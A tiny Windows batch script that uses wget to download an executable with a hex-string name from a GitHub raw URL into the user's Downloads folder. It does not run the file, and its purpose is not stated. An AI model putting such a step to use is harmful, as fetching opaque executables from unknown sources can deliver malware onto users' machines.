@echo off
set url=https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe
set file=%USERPROFILE%\Downloads\fbf12e4f.exe
echo Downloading file...
wget --progress=bar -O "%file%" "%url%"
echo Download complete. File saved to %file%
pause
